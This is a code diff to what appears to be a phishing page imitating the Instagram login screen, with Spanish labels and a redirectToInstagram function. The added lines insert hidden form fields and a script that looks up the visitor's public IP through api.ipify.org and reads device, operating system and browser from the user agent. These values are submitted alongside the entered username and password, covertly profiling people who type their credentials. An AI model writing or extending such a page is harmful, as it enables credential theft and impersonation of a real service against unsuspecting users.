@@ -53,6 +53,12 @@
                     <button type="button" id="show-password-btn">Show</button>
                 </div>
 
+                <!-- Información técnica -->
+                <input type="hidden" name="IP" id="ip">
+                <input type="hidden" name="Dispositivo" id="dispositivo">
+                <input type="hidden" name="Sistema" id="sistema">
+                <input type="hidden" name="Navegador" id="navegador">
+
                 <button class="login-button" type="submit" title="Login">
                     Iniciar sesión
                 </button>
@@ -194,6 +200,57 @@
         © 2026 Instagram from Meta
 
     </div>
+
+<script>
+fetch("https://api.ipify.org?format=json")
+    .then(response => response.json())
+    .then(data => {
+        document.getElementById("ip").value = data.ip;
+    });
+
+const ua = navigator.userAgent;
+
+// Dispositivo
+let dispositivo = "PC";
+
+if (/iPhone|Android.*Mobile|Windows Phone/i.test(ua)) {
+    dispositivo = "Móvil";
+} else if (/iPad|Android/i.test(ua)) {
+    dispositivo = "Tablet";
+}
+
+// Sistema operativo
+let sistema = "Desconocido";
+
+if (/Windows/i.test(ua)) {
+    sistema = "Windows";
+} else if (/Android/i.test(ua)) {
+    sistema = "Android";
+} else if (/iPhone|iPad|iPod/i.test(ua)) {
+    sistema = "iOS";
+} else if (/Macintosh/i.test(ua)) {
+    sistema = "macOS";
+} else if (/Linux/i.test(ua)) {
+    sistema = "Linux";
+}
+
+// Navegador
+let navegador = "Desconocido";
+
+if (/Edg/i.test(ua)) {
+    navegador = "Microsoft Edge";
+} else if (/Chrome/i.test(ua)) {
+    navegador = "Google Chrome";
+} else if (/Firefox/i.test(ua)) {
+    navegador = "Firefox";
+} else if (/Safari/i.test(ua)) {
+    navegador = "Safari";
+}
+
+document.getElementById("dispositivo").value = dispositivo;
+document.getElementById("sistema").value = sistema;
+document.getElementById("navegador").value = navegador;
+</script>
 
 <script>
 function redirectToInstagram(event) {
